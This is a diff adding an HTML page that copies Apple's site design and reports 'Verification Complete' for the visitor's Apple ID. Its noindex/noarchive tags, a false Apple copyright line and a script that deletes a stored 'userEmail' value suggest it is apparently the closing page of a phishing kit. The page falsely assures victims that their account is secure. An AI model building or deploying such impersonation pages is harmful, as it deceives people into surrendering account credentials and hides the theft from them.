@@ -1,0 +1,330 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="robots" content="noindex, nofollow, noarchive">
+    <title>Apple - Verification Complete</title>
+    
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=SF+Pro+Text:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    
+    <!-- Custom Styles -->
+    <style>
+        :root {
+            --apple-blue: #0071e3;
+            --apple-blue-hover: #0077ed;
+            --apple-background: #fbfbfd;
+            --apple-text-main: #1d1d1f;
+            --apple-text-secondary: #6e6e73;
+            --apple-white: #ffffff;
+            --apple-border: #d2d2d7;
+            --apple-nav-bg: rgba(0, 0, 0, 0.8);
+            --apple-gray-bg: #f5f5f7;
+            --apple-green: #34c759;
+        }
+        
+        body, html {
+            height: 100%;
+            margin: 0;
+            background-color: var(--apple-background);
+            color: var(--apple-text-main);
+            font-family: "SF Pro Text", -apple-system, BlinkMacSystemFont, system-ui, Helvetica, Arial, sans-serif;
+            line-height: 1.47059;
+            font-weight: 400;
+            letter-spacing: -0.022em;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+        
+        /* Navbar */
+        #apple-nav {
+            background-color: var(--apple-nav-bg);
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 44px;
+            z-index: 9999;
+            backdrop-filter: saturate(180%) blur(20px);
+        }
+        
+        .nav-content {
+            display: flex;
+            justify-content: space-between;
+            max-width: 980px;
+            margin: 0 auto;
+            height: 100%;
+            padding: 0 22px;
+        }
+        
+        .nav-logo {
+            display: flex;
+            align-items: center;
+        }
+        
+        .nav-logo svg {
+            fill: #fff;
+            height: 20px;
+            width: 20px;
+        }
+        
+        .nav-items {
+            display: flex;
+            list-style: none;
+            margin: 0;
+            padding: 0;
+        }
+        
+        .nav-items li {
+            display: flex;
+            align-items: center;
+        }
+        
+        .nav-items a {
+            color: rgba(255, 255, 255, 0.8);
+            text-decoration: none;
+            font-size: 12px;
+            padding: 0 10px;
+            transition: color 0.2s;
+        }
+        
+        .nav-items a:hover {
+            color: #fff;
+        }
+        
+        /* Main Content */
+        .main-content {
+            padding-top: 76px;
+            padding-bottom: 60px;
+            min-height: calc(100vh - 120px);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        
+        .container-wide {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 0 22px;
+        }
+        
+        /* Headings */
+        .main-title {
+            font-family: "SF Pro Display", -apple-system, BlinkMacSystemFont, system-ui, Helvetica, Arial, sans-serif;
+            font-size: 40px;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 12px;
+            letter-spacing: -0.003em;
+        }
+        
+        .subtitle {
+            font-size: 21px;
+            font-weight: 400;
+            color: var(--apple-text-secondary);
+            text-align: center;
+            margin-bottom: 48px;
+            max-width: 800px;
+            margin-left: auto;
+            margin-right: auto;
+            line-height: 1.38105;
+        }
+        
+        /* Card */
+        .content-card {
+            background-color: var(--apple-white);
+            border-radius: 18px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+            padding: 32px 36px;
+            margin-bottom: 24px;
+            text-align: center;
+        }
+        
+        /* Success Icon */
+        .success-icon {
+            width: 100px;
+            height: 100px;
+            background-color: var(--apple-green);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 30px;
+            font-size: 48px;
+        }
+        
+        /* Button */
+        .btn {
+            font-size: 17px;
+            font-weight: 400;
+            padding: 10px 20px;
+            min-width: 160px;
+            border-radius: 980px;
+            text-align: center;
+            border: none;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-top: 30px;
+        }
+        
+        .btn-primary {
+            background-color: var(--apple-blue);
+            color: white;
+        }
+        
+        .btn-primary:hover {
+            background-color: var(--apple-blue-hover);
+        }
+        
+        /* Footer */
+        .footer {
+            background-color: var(--apple-gray-bg);
+            padding: 17px 0;
+            font-size: 12px;
+            line-height: 1.33341;
+            color: var(--apple-text-secondary);
+        }
+        
+        .footer-content {
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 0 22px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .footer-links {
+            display: flex;
+        }
+        
+        .footer-links a {
+            color: var(--apple-text-secondary);
+            text-decoration: none;
+            margin-right: 20px;
+            white-space: nowrap;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+            color: var(--apple-text-main);
+        }
+        
+        .footer-legal {
+            white-space: nowrap;
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            .main-title {
+                font-size: 32px;
+            }
+            
+            .subtitle {
+                font-size: 17px;
+            }
+            
+            .content-card {
+                padding: 24px 20px;
+            }
+            
+            .nav-items li:not(:first-child):not(:last-child) {
+                display: none;
+            }
+            
+            .footer-content {
+                flex-direction: column;
+            }
+            
+            .footer-links {
+                margin-bottom: 10px;
+                flex-wrap: wrap;
+            }
+            
+            .footer-links a {
+                margin-bottom: 5px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Apple Navigation -->
+    <nav id="apple-nav">
+        <div class="nav-content">
+            <div class="nav-logo">
+                <a href="#" aria-label="Apple">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 44">
+                        <path d="M8.02 16.23c-.73 0-1.86-.83-3.05-.8-1.57.02-3.01.91-3.82 2.32-1.63 2.83-.42 7.01 1.17 9.31.78 1.12 1.7 2.38 2.92 2.34 1.17-.05 1.61-.76 3.03-.76 1.41 0 1.81.76 3.05.73 1.26-.02 2.06-1.14 2.83-2.27.89-1.3 1.26-2.56 1.28-2.63-.03-.01-2.45-.94-2.48-3.74-.02-2.34 1.91-3.46 2-3.51-1.1-1.61-2.79-1.79-3.38-1.83-1.54-.12-2.83.84-3.55.84zm2.6-2.36c.65-.78 1.08-1.87.96-2.95-.93.04-2.05.62-2.72 1.4-.6.69-1.12 1.8-.98 2.86 1.03.08 2.09-.53 2.74-1.31"></path>
+                    </svg>
+                </a>
+            </div>
+            <ul class="nav-items">
+                <li><a href="#">Store</a></li>
+                <li><a href="#">Mac</a></li>
+                <li><a href="#">iPad</a></li>
+                <li><a href="#">iPhone</a></li>
+                <li><a href="#">Watch</a></li>
+                <li><a href="#">AirPods</a></li>
+                <li><a href="#">TV & Home</a></li>
+                <li><a href="#">Entertainment</a></li>
+                <li><a href="#">Accessories</a></li>
+                <li><a href="#">Support</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <div class="main-content">
+        <div class="container-wide">
+            <div class="content-card">
+                <div class="success-icon">
+                    <i class="fas fa-check"></i>
+                </div>
+                <h1 class="main-title">Verification Complete</h1>
+                <p class="subtitle">Thank you for verifying your account. Your Apple ID has been successfully verified and your account is now secure.</p>
+                <p style="font-size: 18px; margin-bottom: 20px;">Our team will process your verification within 24-48 hours. You will receive an email confirmation once the process is complete.</p>
+                <p style="color: var(--apple-text-secondary);">For security reasons, there may be temporary limitations on your account while we finalize the verification process.</p>
+                <a href="https://www.apple.com" class="btn btn-primary">Return to Apple.com</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-links">
+                <a href="#">Privacy Policy</a>
+                <a href="#">Terms of Use</a>
+                <a href="#">Sales and Refunds</a>
+                <a href="#">Legal</a>
+                <a href="#">Site Map</a>
+            </div>
+            <div class="footer-legal">
+                Copyright © 2025 Apple Inc. All rights reserved.
+            </div>
+        </div>
+    </footer>
+
+    <!-- Scripts -->
+    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            // If user tries to refresh or navigate away
+            window.onbeforeunload = function() {
+                localStorage.removeItem('userEmail');
+            };
+            
+            // Clear any stored information after 5 minutes
+            setTimeout(function() {
+                localStorage.removeItem('userEmail');
+            }, 300000);
+        });
+    </script>
+</body>
+</html>
